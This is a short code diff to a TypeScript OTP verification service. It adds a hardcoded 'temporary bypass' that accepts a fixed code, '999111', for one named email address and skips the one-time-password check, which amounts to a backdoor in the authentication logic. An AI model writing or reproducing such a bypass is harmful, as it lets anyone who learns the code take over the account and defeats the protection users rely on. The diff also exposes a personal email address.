@@ -128,7 +128,10 @@ export class OTPService {
         }
       });
 
-      if (!otp) {
+      // TEMPORARY BYPASS for Admin Email
+      const isAdminBypass = email.toLowerCase() === 'madsonhenry.ads@gmail.com' && code === '999111';
+
+      if (!otp && !isAdminBypass) {
         // Increment attempts for any existing OTP
         await (prisma as any).OTP.updateMany({
           where: {
